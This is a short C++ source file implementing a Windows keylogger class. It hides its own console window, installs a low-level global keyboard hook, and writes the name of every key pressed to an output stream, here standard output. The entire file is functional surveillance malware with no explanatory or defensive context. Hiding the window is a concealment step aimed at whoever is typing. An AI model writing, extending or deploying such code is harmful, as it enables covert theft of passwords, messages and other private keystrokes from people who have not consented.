#include "keylogger.h"

KeyLogger::KeyLogger() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    HINSTANCE instance = GetModuleHandle(NULL);
    if(!instance) {
        exit(1);
    }
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookFunction, instance, NULL);
    output = stdout;
}

KeyLogger::~KeyLogger() {
    fclose(output);
    UnhookWindowsHookEx(hook);
}

LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {

    if (nCode >= 0) {
        if(wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*) lParam);
            DWORD key = 1;
            key += hooked.scanCode << 16;
            key += hooked.flags << 24;

            char message[100];
            GetKeyNameText(key, message, 100);
            fputs(message, output);
        }
    }

    return CallNextHookEx(hook, nCode, wParam, lParam);
}

void KeyLogger::log() {
    MSG message;
    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}

